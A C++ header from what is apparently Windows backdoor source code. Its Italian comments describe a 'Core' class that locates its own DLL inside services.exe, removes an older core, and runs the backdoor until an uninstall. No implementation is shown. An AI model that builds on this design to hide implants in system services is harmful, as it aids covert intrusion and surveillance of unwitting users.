#include "Common.h"
#include "common_new.h"
#include <string>
#include <exception>
using namespace std;

#ifndef __Core_h__
#define __Core_h__

#include "Task.h"

class Task;
class Core;

class Core
{
	private: Task *taskObj;

	/**
	* Trova la nostra DLL all'interno di services.exe e torna il nome. Il buffer
	* va liberato dal chiamante, se la funzione non trova la DLL allora torna NULL.
	*/
	private: void GetMyName(wstring &strName);

	/**
	* Rimuoviamo il vecchio core, se c'e', torna TRUE se la cancellazione va a buon
	* fine, FALSE altrimenti.
	*/
	private: BOOL RemoveOldCore();

	public: Core();
	~Core();

	/**
	 * Avvia la backdoor, torna soltanto in caso di errore o uninstall. Torna TRUE se l'uninstall e' andato
	 * a buon fine, FALSE altrimenti. Torna FALSE anche se c'e' stato un errore critico.
	 */
	public: BOOL Run();
};

#endif
